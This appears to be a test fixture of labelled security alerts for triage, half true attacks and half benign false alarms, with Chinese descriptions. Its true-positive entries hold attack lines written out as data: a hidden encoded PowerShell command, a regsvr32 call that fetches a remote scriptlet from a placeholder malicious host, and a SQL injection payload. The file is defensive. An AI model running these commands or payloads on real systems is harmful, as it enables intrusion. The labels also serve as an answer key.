@@ -1,0 +1,199 @@
+{
+  "alerts": [
+    {
+      "alert_id": "TP-001",
+      "timestamp": "2026-07-18T02:13:44Z",
+      "source": "edr",
+      "severity": "high",
+      "src_ip": "10.20.33.51",
+      "dst_ip": "185.220.101.34",
+      "src_port": 49832,
+      "dst_port": 4444,
+      "protocol": "TCP",
+      "rule_name": "Suspicious reverse shell to known C2",
+      "description": "powershell.exe 由 WINWORD.EXE 启动，外连 185.220.101.34:4444（已知 C2 服务器），疑似钓鱼宏落地后的命令控制阶段。",
+      "raw_payload": {
+        "process": "powershell.exe",
+        "parent_process": "WINWORD.EXE",
+        "user": "finance_user_03",
+        "cmdline": "powershell -nop -w hidden -enc <base64>",
+        "attck": ["T1059.001", "T1071.001"]
+      },
+      "label": "真阳"
+    },
+    {
+      "alert_id": "TP-002",
+      "timestamp": "2026-07-18T03:42:11Z",
+      "source": "ndr",
+      "severity": "high",
+      "src_ip": "10.20.33.51",
+      "dst_ip": "10.20.40.7",
+      "src_port": 51322,
+      "dst_port": 445,
+      "protocol": "SMB",
+      "rule_name": "Lateral movement via SMB admin share",
+      "description": "内网横向移动：财务主机 10.20.33.51 尝试访问域控 10.20.40.7 的 ADMIN$ 共享，伴随 PsExec 特征流量，疑似权限提升后的横向扩散。",
+      "raw_payload": {
+        "share": "ADMIN$",
+        "tool": "psexec",
+        "attck": ["T1021.002", "T1570"]
+      },
+      "label": "真阳"
+    },
+    {
+      "alert_id": "TP-003",
+      "timestamp": "2026-07-18T04:05:22Z",
+      "source": "edr",
+      "severity": "high",
+      "src_ip": "10.20.31.18",
+      "dst_ip": null,
+      "src_port": null,
+      "dst_port": null,
+      "protocol": null,
+      "rule_name": "PowerShell encoded command execution",
+      "description": "检出编码 PowerShell 命令：regsvr32 通过 regsvr32.exe /s /u /i:http://... 调用远程脚本（spearphish 后的 LOLBin 执行）。",
+      "raw_payload": {
+        "process": "regsvr32.exe",
+        "cmdline": "regsvr32 /s /u /i:https:// malicious.example /scrobj.dll",
+        "attck": ["T1218.010", "T1027"]
+      },
+      "label": "真阳"
+    },
+    {
+      "alert_id": "TP-004",
+      "timestamp": "2026-07-18T05:18:39Z",
+      "source": "waf",
+      "severity": "high",
+      "src_ip": "203.0.113.77",
+      "dst_ip": "10.10.20.5",
+      "src_port": 51888,
+      "dst_port": 443,
+      "protocol": "HTTPS",
+      "rule_name": "SQL injection in login form",
+      "description": "WAF 命中 SQLi 规则：login 参数包含 UNION SELECT + sleep(5)，载荷匹配经典盲注模式，单 IP 5 分钟内触发 42 次。",
+      "raw_payload": {
+        "param": "username",
+        "payload": "admin' UNION SELECT sleep(5)-- -",
+        "hit_count_5min": 42,
+        "attck": ["T1190"]
+      },
+      "label": "真阳"
+    },
+    {
+      "alert_id": "TP-005",
+      "timestamp": "2026-07-18T06:51:03Z",
+      "source": "siem",
+      "severity": "medium",
+      "src_ip": "10.20.35.99",
+      "dst_ip": "10.20.40.7",
+      "src_port": null,
+      "dst_port": 389,
+      "protocol": "LDAP",
+      "rule_name": "LDAP brute force against domain controller",
+      "description": "域控 LDAP 暴力破解：主机 10.20.35.99 在 3 分钟内尝试 1284 次登录，覆盖多个域账号，命中率 0.3%。",
+      "raw_payload": {
+        "attempt_count": 1284,
+        "window_min": 3,
+        "targeted_accounts": ["administrator", "svc_backup", "hr_admin"],
+        "attck": ["T1110.001"]
+      },
+      "label": "真阳"
+    },
+    {
+      "alert_id": "FP-001",
+      "timestamp": "2026-07-18T01:00:12Z",
+      "source": "ids",
+      "severity": "low",
+      "src_ip": "10.20.30.5",
+      "dst_ip": "10.20.40.7",
+      "src_port": 51230,
+      "dst_port": 22,
+      "protocol": "TCP",
+      "rule_name": "Possible port scan detected",
+      "description": "IDS 报端口扫描：运维主机 10.20.30.5 对域控发起连续 TCP SYN。核查为 nightly-monitor 脚本的健康检查，目标端口固定为 22，单次连接后即 RST。",
+      "raw_payload": {
+        "script": "nightly-monitor.sh",
+        "owner": "ops_team",
+        "interval": "daily 01:00"
+      },
+      "label": "假阳"
+    },
+    {
+      "alert_id": "FP-002",
+      "timestamp": "2026-07-18T02:30:45Z",
+      "source": "ndr",
+      "severity": "low",
+      "src_ip": "10.20.33.200",
+      "dst_ip": "140.82.112.4",
+      "src_port": 49811,
+      "dst_port": 443,
+      "protocol": "HTTPS",
+      "rule_name": "Unusual outbound HTTPS to foreign IP",
+      "description": "外连境外 IP 140.82.112.4:443。核查为开发主机访问 github.com 的 CDN 节点（AS36459 GitHub），属日常代码拉取行为，每周固定出现。",
+      "raw_payload": {
+        "rdns": "github.com",
+        "asn": "AS36459",
+        "frequency": "weekly"
+      },
+      "label": "假阳"
+    },
+    {
+      "alert_id": "FP-003",
+      "timestamp": "2026-07-18T03:15:00Z",
+      "source": "ids",
+      "severity": "info",
+      "src_ip": "10.20.40.15",
+      "dst_ip": "10.20.40.7",
+      "src_port": 50231,
+      "dst_port": 443,
+      "protocol": "HTTPS",
+      "rule_name": "CDN origin pull traffic",
+      "description": "CDN 回源流量告警：源站 10.20.40.15 收到来自 CDN 节点的批量回源请求。属正常缓存刷新任务，匹配 cron job `cdn-refresh`。",
+      "raw_payload": {
+        "cron": "*/15 * * * *",
+        "job": "cdn-refresh",
+        "owner": "webops"
+      },
+      "label": "假阳"
+    },
+    {
+      "alert_id": "FP-004",
+      "timestamp": "2026-07-18T04:00:00Z",
+      "source": "siem",
+      "severity": "info",
+      "src_ip": "10.20.30.50",
+      "dst_ip": "10.20.40.7",
+      "src_port": null,
+      "dst_port": 443,
+      "protocol": "HTTPS",
+      "rule_name": "Repetitive login attempts from internal host",
+      "description": "内部主机 10.20.30.50 对 SSO 服务高频登录。核查为 svc_monitor 服务账号的可用性探针，每分钟固定 6 次，密码全部正确。",
+      "raw_payload": {
+        "account": "svc_monitor",
+        "interval_per_min": 6,
+        "success_rate": 1.0
+      },
+      "label": "假阳"
+    },
+    {
+      "alert_id": "FP-005",
+      "timestamp": "2026-07-18T05:30:00Z",
+      "source": "edr",
+      "severity": "low",
+      "src_ip": "10.20.35.10",
+      "dst_ip": null,
+      "src_port": null,
+      "dst_port": null,
+      "protocol": null,
+      "rule_name": "Suspicious PowerShell invocation",
+      "description": "检出 powershell.exe 执行。核查为备份脚本 dbbackup.ps1 的常规调用，命令行明文、签名验证通过、每日定时执行。",
+      "raw_payload": {
+        "process": "powershell.exe",
+        "script": "C:\\Scripts\\dbbackup.ps1",
+        "signed": true,
+        "cron": "daily 05:30"
+      },
+      "label": "假阳"
+    }
+  ]
+}
